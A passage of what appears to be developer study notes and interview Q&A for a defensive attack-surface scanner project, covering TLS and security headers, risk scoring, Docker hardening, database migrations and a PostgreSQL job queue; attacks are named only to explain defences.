  - **Self-Signed Certificate (`issuer_equals_subject`):** Means no trusted third-party CA validated domain ownership. Attackers on the local network (or via ARP/DNS poisoning) can easily generate their own self-signed certificates and execute Man-in-the-Middle (MitM) attacks.
  - **Hostname Mismatch:** Indicates that the domain serving traffic does not match the names in the certificate's SAN or CN. This commonly happens when a staging site points to production CDN infrastructure, when a virtual host is misconfigured, or after an incomplete domain migration.

---

### Question 2: What is HTTP Strict Transport Security (HSTS), and why does a weak `max-age` value (e.g. less than 180 days) undermine its security guarantee?
**Answer:**
- **What HSTS Does:** HSTS (`Strict-Transport-Security`) is a response header that instructs web browsers to **never** load the site over plain HTTP and to automatically convert all insecure `http://` links to `https://` before sending any request. It also prevents users from clicking through SSL certificate warnings.
- **Why `max-age` Matters:**
  - When a user types `example.com` into their browser, the initial request is sent over unencrypted HTTP port 80. An attacker on the local network (e.g. public Wi-Fi) can intercept this initial request using an SSL-stripping tool (like `sslstrip`) before the server can redirect to HTTPS.
  - HSTS caches the requirement to use HTTPS in the user's browser for the duration of `max-age` seconds.
  - A short `max-age` (e.g. a few hours or days) expires quickly. If a user does not visit the site frequently, their cached HSTS rule expires, reopening the window for SSL-stripping and downgrade attacks. The security community (and Chromium HSTS Preload list) mandates a minimum `max-age` of at least 180 days (15,552,000 seconds), with 1–2 years recommended.

---

### Question 3: What is the primary security objective of Content Security Policy (CSP), and what types of attacks does it mitigate?
**Answer:**
- **Primary Objective:** CSP is an HTTP response header (`Content-Security-Policy`) that allows site administrators to declare an approved allowlist of sources from which the browser is permitted to load and execute dynamic resources (JavaScript, CSS, images, iframes, fonts, media).
- **Attacks Mitigated:**
  - **Cross-Site Scripting (XSS):** By restricting script execution to approved domains and disallowing inline scripts (`'unsafe-inline'`) or `eval()` (`'unsafe-eval'`), CSP prevents injected malicious scripts from executing even if an attacker successfully injects code into an HTML page.
  - **Clickjacking / UI Redressing:** Using the `frame-ancestors` directive (which supersedes `X-Frame-Options`), CSP dictates which parent domains are allowed to embed the current page inside an `<iframe>`, preventing attackers from tricking users into clicking invisible buttons.
  - **Data Exfiltration:** CSP restricts where forms can be submitted (`form-action`) and where background network requests can be sent (`connect-src`), preventing malicious scripts from beaconing stolen session tokens or credentials to external attacker-controlled servers.

---

### Question 4: How do information-disclosure headers (such as `Server`, `X-Powered-By`, `X-AspNet-Version`) assist an attacker during the reconnaissance phase?
**Answer:**
- **Technology Stack Fingerprinting:** Headers like `Server: Apache/2.4.49`, `X-Powered-By: PHP/7.4.3`, or `X-AspNet-Version: 4.0.30319` explicitly tell an attacker the exact web server software, programming language runtime, and web framework versions powering the application.
- **Accelerating Exploit Discovery:** Rather than sending noisy, generalized probe payloads that might trigger a Web Application Firewall (WAF), an attacker can immediately cross-reference the leaked version numbers against public vulnerability databases (CVEs) and exploit repositories (e.g. finding that Apache 2.4.49 is vulnerable to path traversal CVE-2021-41773).
- **Remediation:** Production servers should suppress, strip, or minimize these headers (e.g. `ServerTokens Prod` in Apache, `server_tokens off` in Nginx, or removing `X-Powered-By` in Express/PHP) to enforce defense-in-depth and make reconnaissance more costly for adversaries.

---

### Question 5: Why is the single-connection preference with a two-pass fallback pattern an ideal design for Attack Surface Management tools?
**Answer:**
1. **Network Efficiency & Politeness:** Opening new TCP connections and performing cryptographic TLS handshakes consumes network bandwidth and CPU cycles on both the scanner and the target server. By reading the active TLS peer certificate directly from the underlying transport stream of the HTTP response (`network_stream`), the tool collects both HTTP headers and TLS certificates in a single round-trip.
2. **Graceful Degradation:** Production networks are messy. If a certificate is invalid (expired or self-signed), a strict client like `httpx` will abort the connection immediately during TLS verification. By catching this verification failure and executing a targeted unverified fallback (`verify_mode = ssl.CERT_NONE`), the scanner avoids crashing, records the exact cause of untrust, and still inspects the host's headers and protocol version.
3. **Audit Trail & Transparency:** Tracking the source of inspection (`from_response` vs. `from_socket`) ensures the resulting ASM report clearly indicates whether the host allowed a standard verified session or required low-level socket fallback.

---

# Part 5: v1 Step 5 — Risk Scoring & Combined Report

## 1. Plain-English Code Walkthrough

### `src/asm/scoring.py`
- **What it is:** The defensive risk scoring and multi-stage report aggregation engine.
- **Why it exists:** Previous steps generated isolated reports for subdomains, HTTP probing, open ports, and TLS/header issues. This module combines these disjoint observations into a unified, actionable risk assessment per host and across the entire domain without generating any network packets.
- **Key Architecture & Design Decisions:**
  - **Single Central Table (`FINDING_DEFINITIONS`):** All 21 finding types are declared in one table at the top of the module with static IDs, titles, severity tiers, points, and human-readable security impact strings (`why_it_matters`). This makes the scoring rules easily auditable, consistent, and defensible.
  - **Host Band Derived from Worst Finding Tier (Rule 1):** Rather than arbitrary point bucket math where multiple trivial issues could artificially create a "critical" host, a host's severity band is determined strictly by its **worst finding tier**:
    - Any `CRITICAL` finding $\rightarrow$ `CRITICAL`
    - Else any `HIGH` finding $\rightarrow$ `HIGH`
    - Else any `MEDIUM` finding $\rightarrow$ `MEDIUM`
    - Else any `LOW` finding $\rightarrow$ `LOW`
    - Else $\rightarrow$ `INFO` (clean host)
    The point sum is preserved and used as a secondary tiebreaker for sorting within each band.
  - **Service Confirmation Distinguishes CRITICAL vs. HIGH (Rule 2):** An exposed database port (3306, 5432, 6379) that returned an active service banner is designated `CRITICAL` (`PORT_CONFIRMED_DB`, 10 pts) because it confirms an active, reachable database engine on the internet. An open DB port without a banner remains `HIGH` (`PORT_EXPOSED_DB`, 7 pts).
  - **Honest Split on Untrusted Certificates (Rule 3):** An expired or not-yet-valid certificate is classified as `HIGH` (definitive failure of trust and browser availability). In contrast, a self-signed certificate (`issuer_equals_subject`) on an unexpired certificate is classified as `MEDIUM` (`TLS_SELF_SIGNED`, 4 pts), explicitly documenting that it may be intentional for internal or development assets.
  - **Domain Band Derivation (Rule 4):**
    - Any `CRITICAL` host $\rightarrow$ Domain `CRITICAL`
    - Else any `HIGH` host $\rightarrow$ Domain `HIGH` (with an escalation note flagged if $\ge 3$ high hosts exist)
    - Else any `MEDIUM` host $\rightarrow$ Domain `MEDIUM`
    - Else any `LOW` host $\rightarrow$ Domain `LOW`
    - Else $\rightarrow$ Domain `INFO`
  - **Stage Evaluators:** Dedicated functions (`evaluate_probe_findings`, `evaluate_portscan_findings`, `evaluate_inspect_findings`) convert raw report data into typed `Finding` objects with concrete proof strings.

### `src/asm/models.py` (Scoring Models)
- Added `SeverityTier` (`StrEnum`: `CRITICAL`, `HIGH`, `MEDIUM`, `LOW`, `INFO`).
- Added `Finding` (`dataclass`): Represents a single security issue with `id`, `title`, `tier`, `points`, `source`, `host`, `port`, `evidence`, and `why_it_matters`.
- Added `HostScore` (`dataclass`): Aggregated risk score, worst-tier severity band, and itemized findings for a host.
- Added `ScoreReport` (`dataclass`): Domain-wide aggregation report with timestamp, inputs used, domain band, total score, summary counts, and host list.

### `src/asm/scan_common.py` (`load_and_validate_generic_report`)
- Added generic report loader treating all input files as untrusted. Verifies JSON structure, validates the `domain` field, asserts all input reports belong to the exact same domain, and ensures the `results` list exists. Raises `ReportValidationError` on any failure.

### `src/asm/cli.py` (`handle_score`)
- Added `asm score --discover <f> [--probe <f>] [--portscan <f>] [--inspect <f>] [-o DIR] [-v]`.
- Does not require `--authorized` because it performs zero network activity.
- Generates `output/<domain>_score_<UTC>.json` and formats a human-readable CLI summary sorted worst-first.

---

## 2. Five Step 5 Cybersecurity Interview Questions & Answers

### Question 1: Why should an Attack Surface Management tool use categorical severity tiers (CRITICAL, HIGH, MEDIUM, LOW) instead of an arbitrary 0–10 score?
**Answer:**
- **Actionability Over False Precision:** Arbitrary floating-point numbers (e.g. "Risk Score: 7.42") convey a false sense of mathematical precision. Security teams cannot realistically differentiate the urgency of a 7.2 vs. a 7.4. Categorical tiers map directly to operational triage workflows and Service Level Agreements (SLAs) (e.g. CRITICAL = 24-hour remediation, HIGH = 7-day remediation, MEDIUM = 30 days).
- **Preventing "Point Inflation":** Point-only scoring algorithms suffer from distortion where dozens of minor informational findings (like missing headers) can sum up to a high number, artificially labeling a low-risk blog as more dangerous than a server exposing an unauthenticated database. Determining the host band by its **worst finding tier** ensures that critical risks are never masked or artificially created.

---

### Question 2: Why must risk scoring be strictly driven by observable evidence, and what is the danger of a finding without evidence?
**Answer:**
- **Defensibility & Credibility:** In security operations, developer pushback against vulnerability scanners is common. A finding that states *"Host has insecure database"* without evidence will be contested or ignored. A finding with concrete evidence (*"Port 3306 (mysql) is OPEN with confirmed service banner: '5.7.34-log MySQL Community Server'"*) is irrefutable.
- **Root Cause & Remediation:** Concrete evidence provides engineers with the exact diagnostic data required to fix the issue (e.g. the specific port, the exact missing header name, or the certificate expiry date).
- **Audit Compliance:** External compliance frameworks (SOC 2, ISO 27001, PCI-DSS) require evidence-based verification for every identified finding to support formal remediation tracking.

---

### Question 3: How do you justify classifying a confirmed exposed database port with an active banner as CRITICAL, while an open database port without a banner is classified as HIGH?
**Answer:**
- **Confirmed Reachability vs. Firewall Artifacts:** An open TCP port without a banner confirms that a three-way TCP handshake succeeded, but does not prove what software is running behind it. It could be a honeypot, an intermediate firewall performing full proxying, or a load balancer. It remains a `HIGH` risk because sensitive ports should never be accessible from the public internet.
- **Immediate Weaponization Potential (CRITICAL):** When a database port returns an active protocol greeting banner (e.g. MySQL packet handshake or PostgreSQL error response), it conclusively proves that an active database daemon is directly accepting untrusted packets from the public internet. This exposes the organization to immediate remote authentication attacks, zero-day CVE exploitation, and severe data breach risks.

---

### Question 4: In attack surface management, what are false positives vs. false negatives, and how does this heuristic triage model balance them?
**Answer:**
- **Definitions:**
  - **False Positive:** Flagging an issue that does not actually pose risk (e.g. marking a self-signed certificate on an internal staging server as a critical vulnerability). Excessive false positives cause "alert fatigue" and lead engineers to distrust the scanner.
  - **False Negative:** Failing to detect an actual security flaw (e.g. missing an open database or an expired certificate). False negatives create a false sense of security and leave real vulnerabilities exposed.
- **How This Model Balances Them:**
  - Avoids false positives by honestly splitting findings (e.g. self-signed certificates are `MEDIUM`, acknowledging that dev environments intentionally use them; plaintext HTTP is only flagged if port 80 is live while port 443 is unreachable).
  - Avoids false negatives by performing multi-stage correlation (linking port scan results, probe HTTP statuses, and TLS handshake findings across all discovered host assets).

---

### Question 5: What are the fundamental limitations of static heuristic scoring models, and why is this model explicitly NOT CVSS?
**Answer:**
- **What CVSS Is:** The Common Vulnerability Scoring System (CVSS) is an industry standard for rating specific, identified software vulnerabilities (CVEs) based on standardized metrics: Attack Vector (AV), Attack Complexity (AC), Privileges Required (PR), User Interaction (UI), Scope (S), and Impact (Confidentiality, Integrity, Availability).
- **Why This Model is NOT CVSS:**
  - Our ASM scanner evaluates external **configuration posture** and **exposure surface** (e.g. missing defensive headers, open ports, certificate lifespan), not confirmed exploitable software vulnerabilities in a CVE database.
  - Calling heuristic ASM scoring "CVSS" is dishonest and misleading to customers and auditors.
- **Fundamental Limitations of Heuristic Models:**
  1. **No Context on Compensating Controls:** The scanner cannot see internal network segmentation, Web Application Firewall (WAF) rate limiting, or VPN authentication layers behind the host.
  2. **No Business Context:** A missing header on a marketing landing page that serves static brochures carries far less business impact than the same missing header on a banking portal, but static heuristics score them identically.

---

# Part 6: CLI Containerization & Container Security

## 1. Technical Explanations & Architecture

### Multi-Stage Builds: Reducing Final Image Size and Attack Surface
- **How It Works:** A multi-stage Dockerfile uses multiple `FROM` instructions. The first stage (`builder`) mounts the build context, installs packaging tools (`wheel`, `setuptools`, `pip`), and builds a self-contained Python wheel (`.whl`). The second stage (`runtime`) starts from a fresh base image and copies *only* the compiled wheel artifact from the builder stage, installing it without build tools or source repositories.
- **Image Size Optimization:** Build tooling, compiler caches, git metadata, and intermediate wheel build directories never make it into the runtime image. This reduces the image footprint from several hundred megabytes down to minimal runtime requirements.
- **Attack Surface Reduction:** If an attacker compromises an application running in a container, their post-exploitation capabilities depend on the tools available in that environment. By omitting compilers (`gcc`, `clang`), package build tools, and development libraries from the final runtime image, attackers are deprived of the toolchain required to compile local exploits or privilege escalation binaries.

### Non-Root Execution: A Foundational Container Security Control
- **The Containerization Paradigm:** By default, containers execute as `root` (UID 0). While Linux namespaces (PID, Mount, Net) isolate the container from the host, the kernel itself is shared. If a containerized process running as UID 0 achieves a container breakout (e.g. via a Linux kernel vulnerability or a misconfigured volume mount), the compromised process immediately has root privileges on the host operating system.
- **Least Privilege Implementation:** In our Dockerfile, a dedicated system group and user `asm` (`UID:GID 10001`) are created without administrative privileges. The application runs under this unprivileged user (`USER asm`), and `/app/output` is explicitly provisioned with `chown -R asm:asm`. Even if an attacker finds an arbitrary file write or remote code execution flaw in the scanner, they cannot modify system binaries, install packages, or escalate to root.
- **Linux Host Bind-Mount Permissions:** When bind-mounting a host folder (`-v "$(pwd)/output:/app/output"`) on Linux, the kernel enforces the host filesystem's UID/GID permissions. Passing `--user "$(id -u):$(id -g)"` dynamically aligns the container's execution identity with the host user who invoked Docker, allowing reports to be written without requiring root privileges or world-writable (`chmod 777`) host permissions.

### `.dockerignore`: Preventing Secret Leakage and Cache Invalidation
- **Build Context Overhead:** When `docker build` runs, the Docker CLI sends the entire directory contents (the build context) to the Docker daemon. Without a `.dockerignore`, gigabytes of virtual environments (`.venv/`), git history (`.git/`), and local reports (`output/`) are transferred across the socket, dramatically slowing build times.
- **Preventing Secret Leakage:** Development environments often contain `.env` files with API keys or credentials, local database caches, and test artifacts. If these are copied into the image during `COPY . .`, secrets become baked into container layers permanently—discoverable via `docker history` or container inspection even if deleted in a later command.
- **Cache Poisoning & Determinism:** Local bytecode (`__pycache__/`, `*.pyc`), test caches (`.pytest_cache/`), and linter caches (`.ruff_cache/`) can introduce non-deterministic state or cause layer cache invalidation on unrelated code edits. Excluding these ensures reproducible, hermetic container builds.

### Base Image Tag Pinning
- **Floating Tags vs. Immutable Tags:** Using floating tags like `python:3.12` or `python:3.12-slim` is an operational hazard. An upstream update can silently pull new patch versions, updated Debian packages, or breaking system library changes during a build.
- **Explicit Specification:** Pinned to `python:3.12.14-slim-trixie` across both builder and runtime stages. This guarantees reproducible builds across development, CI, and production environments, while locking the underlying Debian distribution (Debian 13 Trixie) to ensure predictable package and OpenSSL behavior.

### Container Vulnerability Scan
- **Vulnerability Findings (Docker Scout):** A vulnerability scan using Docker Scout on the previously pinned base `python:3.12.9-slim-bookworm` found **5 Critical / 51 High**, all originating from the base image.
- **Remediation via Patch Update:** Updating to `python:3.12.14-slim-trixie` reduced it to **0 Critical / 1 High**.
- **Lesson:** Pinning gives reproducibility but pins go stale, so pair pinning with automated updates (Dependabot).
- **Slim vs. Full Distro Images:** The full non-slim image had ~26 High vs 1 for slim: smaller images mean smaller attack surface.


---

## 2. Three Container Security Interview Questions & Answers

### Question 1: What is container breakout / privilege escalation, and how does running as a non-root user mitigate this risk?
**Answer:**
- **Container Breakout Defined:** A container breakout occurs when a process running inside a container circumvents the Linux isolation boundaries (namespaces, cgroups, seccomp, AppArmor) to interact directly with the host operating system or other containers.
- **The Threat of Root in Containers:** Because the container shares the host operating system's kernel, UID 0 inside a container maps to UID 0 on the host kernel unless user namespaces (`userns-remap`) are explicitly enabled. If an attacker discovers a kernel exploit (such as a dirty COW variant) or exploits a misconfigured volume mount (e.g. docker socket `/var/run/docker.sock` or host `/etc`), having root privileges inside the container allows immediate root takeover of the entire underlying host machine.
- **Non-Root Mitigation:** Running as a dedicated unprivileged user (`UID 10001`) enforces the principle of least privilege. Even if an attacker executes arbitrary code within the application process, they lack permissions to access host devices, modify protected container files, or trigger privileged kernel system calls, dramatically reducing the blast radius of any exploit.

---

### Question 2: How do multi-stage Docker builds enhance both supply chain security and operational performance?
**Answer:**
- **Supply Chain & Vulnerability Surface:**
  - Modern software builds require heavy toolchains: C/C++ compilers, header files (`python3-dev`), build utilities (`make`, `cmake`), and package managers. Each toolchain component introduces CVEs and dependencies that Vulnerability Scanners (Trivy, Grype, Snyk) will flag.
  - Multi-stage builds completely segregate the **build environment** from the **shipping artifact**. The build tools exist only in intermediate build stages that are discarded. The final production image contains only the bare runtime interpreter and the compiled wheel, reducing the number of installed packages and associated Common Vulnerabilities and Exposures (CVEs) by up to 70–80%.
- **Operational Performance:**
  - Smaller images (e.g. 50–150 MB vs 1+ GB) lead to faster network transfers across container registries and CI/CD pipelines, quicker node pulling during auto-scaling events, and lower cloud storage costs.
  - Intermediate layers in the build stage are cached independently, accelerating iterative developer builds when only application source code changes.

---

### Question 3: What is the Docker build context, and why is an unconfigured `.dockerignore` file considered a critical security vulnerability?
**Answer:**
- **Build Context Mechanism:** When `docker build` is executed, the Docker client tarballs everything in the target directory (unless excluded) and transmits it to the Docker daemon prior to evaluating the Dockerfile instructions.
- **Security Vulnerabilities of Missing `.dockerignore`:**
  1. **Accidental Credential Exposure:** Development files like `.env`, private keys (`id_rsa`), configuration secrets, or cloud credentials (`aws_credentials`) located in the project folder are sent to the daemon. If a naive `COPY . /app` instruction exists in the Dockerfile, those secrets are copied into the image layer history. Even if removed in a subsequent `RUN rm .env` step, image layers are immutable; any user with image pull access can extract the secret from the underlying layer blob.
  2. **VCS Metadata Leakage:** Omitting `.git` in `.dockerignore` causes the entire Git commit history to be bundled into the image. Attackers who obtain the container image can run `git log`, inspect deleted commits, inspect commit messages, and extract historical credentials previously committed and rolled back.
  3. **Performance Degradation & Cache Invalidation:** Sending gigabytes of node modules, virtual environments, or output reports bloats build times and continuously invalidates Docker's build layer cache, resulting in unnecessarily slow CI/CD pipelines.

---

# Part 7: v2 Step 1 — Service Foundation: Compose, Database, Migrations & Domains API

## 1. Plain-English Code Walkthrough & Architecture

### `src/asm/config.py` (Pydantic Settings)
- **What it is:** A centralized configuration module powered by `pydantic-settings`.
- **Why it exists:** Modern applications must separate configuration from code (12-Factor App methodology). Hardcoding database URIs or credentials in source code creates severe security vulnerabilities.
- **Key Design Decision (No Default Credentials):** `DATABASE_URL` is marked as required with no default value. If the application or CLI starts without `DATABASE_URL` configured in the environment or `.env`, it fails immediately at startup with an informative error rather than silently attempting to connect with an insecure fallback like `postgres:postgres`.

### `src/asm/db/models.py` (SQLAlchemy 2.0 ORM)
- **What it is:** Declarative database models defining the relational persistence layer for attack surface reconnaissance.
- **Key Entities:**
  - `Domain`: Represents a target domain registered for reconnaissance. Includes `name` (unique, indexed, normalized), `authorized` (boolean), `authorization_note` (optional string), and `created_at` (UTC timestamp).
  - **Fail-Safe Default:** `authorized` defaults to `False` in the database schema. Even if a record were inserted bypassing API validation, it remains unauthorized by default.
  - `ScanRun`: Represents an instance of a scheduled or manual scan pipeline run for a domain. Tracks `domain_id` (foreign key with `ON DELETE CASCADE`), `status` (`queued`, `running`, `succeeded`, `failed`, `cancelled`; `cancelled` = a queued scan stopped by account suspension or organization deletion), `created_at`, `started_at`, `finished_at`, and `error` detail.
  - `ScanResult`: Stores individual stage reports produced during a scan run (`discover`, `probe`, `portscan`, `inspect`, `score`). Uses PostgreSQL's native binary JSON format (`JSONB`) to store polymorphic scan outputs efficiently while enabling indexing and queryability.

### `src/asm/db/session.py` (Database Engine & Session Dependency)
- **What it is:** Session management module providing database connection pools and FastAPI request-scoped sessions.
- **Key Functions:**
  - `get_engine()`: Creates a cached SQLAlchemy engine with connection pool pre-ping enabled (`pool_pre_ping=True`) to automatically discard stale or terminated connections.
  - `get_db()`: Generator function designed for FastAPI dependency injection (`Depends(get_db)`). Yields a fresh database session per request and guarantees `session.close()` in a `finally` block, preventing database connection leaks.

### `alembic.ini` & `migrations/` (Alembic Schema Evolution)
- **What it is:** Database migration framework tailored for SQLAlchemy models.
- **Key Design Decision (Decoupled Connection String):** `alembic.ini` contains no database URL or credentials. Instead, `migrations/env.py` dynamically resolves `DATABASE_URL` at runtime from `asm.config.get_settings()`, ensuring migrations adapt automatically to local development, Docker Compose, and CI environments without credential duplication.
- **Container Integration:** `alembic.ini` and `migrations/` are copied into the Docker runtime image, allowing a lightweight one-shot `migrate` container in Docker Compose to execute `alembic upgrade head` before the API server boots.

### Docker Compose Architecture & PostgreSQL 18 Volume Path
- **Postgres 18 Volume Mount Finding:** In PostgreSQL 18, the official image documentation and container configuration declare the persistent volume at `/var/lib/postgresql` with internal cluster directory `PGDATA=/var/lib/postgresql/18/docker` (verified via `docker inspect postgres:18.6-alpine --format '{{json .Config.Volumes}}'`). Older PostgreSQL versions (<18) used `/var/lib/postgresql/data`. Mounting to `/var/lib/postgresql` ensures full cluster persistence across container rebuilds.
- **Service Dependency Sequencing:** In `docker-compose.yml`, the `db` service runs with a healthcheck (`pg_isready -U $${POSTGRES_USER} -d $${POSTGRES_DB}`). The one-shot `migrate` service depends on `db: condition: service_healthy`. The `api` service depends on `migrate: condition: service_completed_successfully`. A single `docker compose up` automatically brings up the database, applies all migrations, and launches the API.
- **Loopback Port Binding (`127.0.0.1:8000`):** The API currently has no authentication mechanism. Publishing the port on `0.0.0.0` would expose the reconnaissance API to all devices on the local network. Binding strictly to `127.0.0.1:8000` ensures only local loopback processes can communicate with the service.

### `src/asm/api/` (FastAPI REST Service)
- **`schemas.py`**: Pydantic models for request validation (`DomainCreate`) and response serialization (`DomainRead`, `HealthResponse`).
- **`routes.py`**:
  - `GET /health`: Runs `SELECT 1` on the active database session. Returns 200 OK with `{"status": "ok", "database": "connected"}` if reachable, or 503 Service Unavailable if disconnected.
  - `POST /domains`: Enforces the authorization gate (rejects with 422 if `authorized` is not True), verifies domain RFC syntax via `validate_domain()`, normalizes via `normalize_domain()`, and rejects duplicates with HTTP 409 Conflict.
  - `GET /domains` & `GET /domains/{id}`: Returns all domains or single domain details (404 if missing).
- **`main.py`**: Global error handling ensures unexpected internal errors return clean JSON without exposing Python stack traces or internal filenames to clients.

---

## 2. Five v2 Step 1 Interview Questions & Answers

### Question 1: What are the security, maintenance, and performance trade-offs of using an ORM (like SQLAlchemy 2.0) versus Raw SQL queries?
**Answer:**
- **Security (SQL Injection Mitigation):** ORMs automatically parameterize queries by default, separating SQL command syntax from user-supplied data and effectively eliminating SQL injection vulnerabilities. With raw SQL, developers must manually ensure every query uses bound parameters rather than string concatenation or f-strings.
- **Type Safety & Refactoring:** SQLAlchemy 2.0's typed ORM (`Mapped[T]`, `mapped_column()`, `select()`) integrates with static analysis tools (`mypy`, IDE language servers). Renaming a column or changing a data type immediately surfaces compiler/linter warnings across the entire codebase, whereas raw SQL strings fail silently until executed at runtime.
- **Database Portability & Dialect Abstraction:** The ORM abstracts vendor-specific SQL quirks (e.g. differences in date/time math, autoincrement keywords, or boolean representations between SQLite, PostgreSQL, and MySQL).
- **Trade-offs:** High-throughput analytical queries or complex recursive CTEs (Common Table Expressions) can sometimes be slower or more cumbersome to express through ORM abstractions than raw SQL. In high-performance data warehousing or large batch scans, hybrid approaches (using SQLAlchemy's Core `select()` or typed raw SQL with explicit parameter bindings) provide the best of both worlds.

---

### Question 2: Why are automated database migrations (Alembic) essential for team collaboration and production deployment pipelines?
**Answer:**
- **Deterministic Schema Synchronization:** In a team setting, each developer's local database and the shared staging/production databases must evolve in lockstep. Without migrations, developers resort to running ad-hoc `ALTER TABLE` statements manually, leading to "schema drift" where environments diverge and software breaks unpredictably during deployment.
- **Version Control for DDL:** Migration scripts are committed to git alongside the application code that depends on them. This ensures that any git branch or historical release can reproduce the exact schema state it requires (`alembic upgrade head` or `alembic downgrade -1`).
- **Zero-Downtime Deployment Support:** Automated migrations allow operations teams to execute forward-compatible migrations (e.g. adding nullable columns or creating indexes concurrently) in automated CI/CD pipelines before deploying new container code, preventing service interruptions.

---

### Question 3: Why is binding an unauthenticated web service to `127.0.0.1` rather than `0.0.0.0` a critical defense-in-depth measure?
**Answer:**
- **Network Interface Exposure:**
  - `0.0.0.0` (INADDR_ANY) binds the server socket to **all** network interfaces on the host, including physical Ethernet, Wi-Fi adapters, VPN interfaces, and virtual bridges.
  - `127.0.0.1` (loopback) binds exclusively to the local host interface. Packets directed to `127.0.0.1` can only originate from processes running on the exact same operating system kernel; the network stack drops external packets arriving on physical interfaces destined for loopback addresses.
- **Security Implications:** When an API does not yet possess an authentication and authorization layer (e.g. API keys, JWTs, mTLS), binding to `0.0.0.0` allows anyone on the local Wi-Fi, campus network, or corporate subnet to submit requests, register targets, or inspect reconnaissance data. Binding strictly to `127.0.0.1` prevents unauthorized network access by default.

---

### Question 4: How does 12-Factor environment-based configuration improve both operational security and deployment flexibility?
**Answer:**
- **Separation of Config from Code (Factor III):** The Twelve-Factor App methodology mandates that anything that varies between deployments (database credentials, API keys, service endpoints) must be stored in the environment, not in code or version control.
- **Secret Leakage Prevention:** Committing credentials or connection strings to Git risks exposure in repositories, CI logs, or public mirrors. Environment-based config allows sensitive secrets to be injected dynamically at runtime via Docker secrets, Kubernetes secrets, or `.env` files that remain strictly `.gitignore`d.
- **Write-Once, Deploy-Anywhere (Portability):** A single, immutable container image artifact can be built once and deployed across development, automated testing, staging, and production environments without rebuilding or modifying code—only the environment variables passed to the container change.

---

### Question 5: Why is a database-backed background job queue necessary for long-running scanner tasks instead of executing them synchronously inside HTTP request handlers?
**Answer:**
- **HTTP Timeout & Thread Starvation:** Attack surface reconnaissance operations (DNS resolution across hundreds of subdomains, TCP port scans, TLS handshakes, HTTP probing) take anywhere from 10 seconds to several minutes to complete. If executed synchronously inside an HTTP request handler:
  1. Reverse proxies (Nginx, Cloudflare, AWS ALB) and client browsers will timeout after 30–60 seconds, severing the HTTP connection.
  2. Web server worker threads (uvicorn/gunicorn) remain blocked waiting for network I/O, rapidly exhausting the server's connection pool and causing denial of service for other users.
- **Resilience & State Recovery:** A database-backed job queue records each scan run with a state lifecycle (`queued` $\to$ `running` $\to$ `succeeded` / `failed`). If the application container crashes, restarts, or scales, uncompleted jobs remain safely persisted in the database and can be retried or resumed without losing scan context or customer requests.

---

# Part 5: v2.2 — Scan Jobs with a Robust Job Lifecycle

## 1. Plain-English Code Walkthrough

### `src/asm/db/models.py` (Lifecycle & Stage Tracking Extensions)
- **`ScanRun` Extensions:** Added distributed leasing and lifecycle fields:
  - `claim_token` (`UUID`): A unique fencing token generated on every claim to prevent zombie workers from corrupting state.
  - `claimed_by` and `claimed_at`: Identifies the active worker node (`hostname:pid:uuid`).
  - `lease_expires_at`: Heartbeat expiration timestamp (calculated with DB clock `now()`).
  - `attempts` and `max_attempts`: Retry budget counter (defaults to 3).
  - `next_attempt_at`: Exponential backoff schedule for retries.
  - `idempotency_key`: Deduplication token scoped to the domain.
  - Partial Unique Indexes:
    - `uq_scan_runs_active_domain`: Guarantees at most one active (`queued` or `running`) scan per domain.
    - `uq_scan_runs_domain_idempotency`: Prevents duplicate runs for identical idempotency keys.
    - `ix_scan_runs_claimable`: Indexes eligible queued jobs for fast `SKIP LOCKED` querying.
- **`ScanStage` (`scan_stages` table):** Records per-stage progress (`discover`, `probe`, `portscan`, `inspect`, `score`), status (`pending`, `running`, `succeeded`, `failed`, `skipped`), timestamps, duration in milliseconds, and error messages.
- **`ScanResult` Constraint:** Added unique constraint `(scan_run_id, stage)` to guarantee idempotent artifact writes.

### `migrations/versions/0002_scan_jobs_lifecycle.py`
- Alembic migration script supporting bidirectional `upgrade()` and `downgrade()` for all new columns, tables, and partial indexes.

### `src/asm/worker/exceptions.py`
- **`SecurityGateError`:** Raised when domain authorization is missing or revoked. This is a terminal error; the run fails permanently and is never retried.
- **`LostLeaseError`:** Raised when a worker detects its lease was reclaimed by another worker or a write returned 0 affected rows.
- **`EXPECTED_SCANNER_ERRORS`:** Explicit tuple `(CrtshError, DomainValidationError, ReportValidationError, SecurityGateError)`. Known scanner exceptions fail only that stage; anything else is an unexpected worker exception that triggers retry backoff.

### `src/asm/worker/runner.py`
- **`IScannerRunner` Protocol:** Defines injectable runner methods for all 5 pipeline stages.
- **`DirectScannerRunner`:** Production implementation invoking scanner core functions (`discovery`, `prober`, `portscan`, `headers_inspect`, `scoring`) directly in Python without shelling out to CLI or writing files to disk.

### `src/asm/worker/worker.py`
- **`ASMWorker`:** The background daemon engine claiming and executing scan runs:
  - Claims jobs atomically with `FOR UPDATE SKIP LOCKED`.
  - Runs periodic stale lease recovery and poison pill termination at the start of every poll cycle.
  - Dedicated `HeartbeatThread` runs in its own thread with an independent database session, renewing `lease_expires_at` every 15s.
  - Fenced writes: Every database write begins with `SELECT 1 FROM scan_runs WHERE id = :id AND status = 'running' AND claim_token = :token FOR SHARE` and verifies affected rowcounts.
  - Resets stuck `running` stages back to `pending` on resume and logs previous crash errors.
  - Catches `SIGTERM` signals between stages and performs graceful job release without penalizing retry attempts.

### `src/asm/api/routes.py` & `src/asm/api/schemas.py`
- **`POST /domains/{id}/scans`:** Order enforced: (a) 404 if no domain, (b) 422 if unauthorized, (c) 200 with existing run if idempotency key matches, (d) 202 on insert, or 409 with `active_scan_id` if blocked by active scan constraint.
- **`GET /scans/{scan_id}`:** Returns `ScanRunDetail` with per-stage progress.
- **`GET /domains/{id}/scans`:** Historical scan run listing with status filtering and pagination.
- **`GET /scans/{scan_id}/results/{stage}`:** Returns raw JSON stage artifact report.

---

## 2. Five v2.2 Interview Questions & Answers

### Question 1: How does PostgreSQL `FOR UPDATE SKIP LOCKED` work, and why is it superior to naive queue polling or premature Celery/Redis adoption?
**Answer:**
- **Mechanism:** When a worker executes `SELECT id FROM scan_runs WHERE status = 'queued' ORDER BY created_at ASC FOR UPDATE SKIP LOCKED LIMIT 1`, PostgreSQL inspects the candidate rows. If another concurrent worker already holds a row lock on the oldest record, Postgres skips that locked row immediately without blocking and locks the next available unlocked row.
- **Elimination of Lock Contention:** Standard `FOR UPDATE` causes all concurrent workers to block and serialize behind the first worker, creating lock wait queues and potential deadlocks. `SKIP LOCKED` gives each worker a distinct job immediately.
- **Architectural Superiority for Single-Node / Early SaaS:**
